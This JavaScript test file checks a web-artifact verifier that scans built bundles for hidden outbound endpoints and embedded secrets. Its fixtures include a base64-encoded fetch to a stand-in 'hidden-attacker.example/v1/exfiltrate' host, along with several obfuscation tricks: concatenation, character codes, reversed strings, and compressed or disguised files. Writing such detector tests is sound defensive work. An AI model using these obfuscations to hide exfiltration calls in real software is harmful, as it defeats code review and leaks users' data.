import assert from "node:assert/strict";
import { mkdtemp, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { brotliCompressSync, gzipSync } from "node:zlib";
import test from "node:test";

const root = path.resolve(import.meta.dirname, "..");
const verifier = path.join(root, "scripts", "verify-web-artifact.mjs");

async function fixture() {
  const directory = await mkdtemp(path.join(tmpdir(), "rea-hardening-red-team-"));
  const artifact = path.join(directory, "dist");
  await mkdir(artifact);
  const policy = path.join(directory, "policy.json");
  await writeFile(policy, JSON.stringify({ version: 1, allowedHosts: [] }));
  return { directory, artifact, policy, report: path.join(directory, "report.json") };
}

function verify(current) {
  return spawnSync(process.execPath, [
    verifier,
    "--artifact", current.artifact,
    "--policy", current.policy,
    "--report", current.report,
  ], { encoding: "utf8" });
}

test("detects a Base64-hidden external endpoint", async () => {
  const current = await fixture();
  const encoded = Buffer.from("https://hidden-attacker.example/v1/exfiltrate").toString("base64");
  await writeFile(path.join(current.artifact, "app.js"), `fetch(atob('${encoded}'))`);
  assert.equal(verify(current).status, 2);
});

test("detects a credential assembled from short string fragments", async () => {
  const current = await fixture();
  await writeFile(path.join(current.artifact, "app.js"), "const token = 'abcdefgh' + 'ijklmnop' + 'qrstuvwx';");
  assert.equal(verify(current).status, 2);
});

test("scans precompressed gzip and Brotli JavaScript", async () => {
  for (const [extension, compress] of [["gz", gzipSync], ["br", brotliCompressSync]]) {
    const current = await fixture();
    const source = "const password = 'this-must-not-ship-12345';";
    await writeFile(path.join(current.artifact, `app.js.${extension}`), compress(source));
    assert.equal(verify(current).status, 2, extension);
  }
});

test("scans credential material even when the extension looks binary", async () => {
  const current = await fixture();
  await writeFile(path.join(current.artifact, "logo.png"), "-----BEGIN PRIVATE KEY-----\nnot-a-real-key\n-----END PRIVATE KEY-----");
  assert.equal(verify(current).status, 2);
});

test("inventories WebSocket and protocol-relative hosts", async () => {
  const current = await fixture();
  await writeFile(path.join(current.artifact, "app.js"), "new WebSocket('wss://socket.example/ws'); fetch('//cdn.example/payload')");
  assert.equal(verify(current).status, 2);
});

test("detects endpoints assembled with concatenation and array join", async () => {
  for (const source of [
    "fetch('https' + '://joined.example/v1')",
    "fetch(['https', '://array-join.example/v1'].join(''))",
  ]) {
    const current = await fixture();
    await writeFile(path.join(current.artifact, "app.js"), source);
    assert.equal(verify(current).status, 2, source);
  }
});

test("detects percent-escaped and character-code endpoints", async () => {
  for (const source of [
    "fetch(decodeURIComponent('https%3A%2F%2Fpercent.example%2Fv1'))",
    `fetch(String.fromCharCode(${[..."https://char-code.example/v1"].map((character) => character.charCodeAt(0)).join(",")}))`,
  ]) {
    const current = await fixture();
    await writeFile(path.join(current.artifact, "app.js"), source);
    assert.equal(verify(current).status, 2, source);
  }
});

test("scans UTF-16 client configuration", async () => {
  const current = await fixture();
  const content = Buffer.concat([
    Buffer.from([0xff, 0xfe]),
    Buffer.from("const client_secret = 'utf16-secret-must-not-ship';", "utf16le"),
  ]);
  await writeFile(path.join(current.artifact, "runtime-config.bin"), content);
  assert.equal(verify(current).status, 2);
});

test("fails closed on an uninspected archive", async () => {
  const current = await fixture();
  await writeFile(path.join(current.artifact, "download.zip"), Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0]));
  assert.equal(verify(current).status, 2);
});

test("detects a reversed endpoint literal", async () => {
  const current = await fixture();
  const reversed = [..."https://reversed.example/v1"].reverse().join("");
  await writeFile(path.join(current.artifact, "app.js"), `fetch('${reversed}'.split('').reverse().join(''))`);
  assert.equal(verify(current).status, 2);
});

test("detects gzip content disguised by its extension", async () => {
  const current = await fixture();
  await writeFile(path.join(current.artifact, "logo.png"), gzipSync("const token = 'disguised-compressed-secret';"));
  assert.equal(verify(current).status, 2);
});

test("scans BOM-less UTF-16 client configuration", async () => {
  const current = await fixture();
  await writeFile(path.join(current.artifact, "runtime-config.bin"), Buffer.from("const password = 'bomless-utf16-secret';", "utf16le"));
  assert.equal(verify(current).status, 2);
});

test("rejects misspelled policy fields instead of silently weakening the gate", async () => {
  const current = await fixture();
  await writeFile(current.policy, JSON.stringify({ version: 1, allowedHost: [] }));
  await writeFile(path.join(current.artifact, "app.js"), "fetch('https://policy-bypass.example/v1')");
  const result = verify(current);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /unknown policy field/);
});
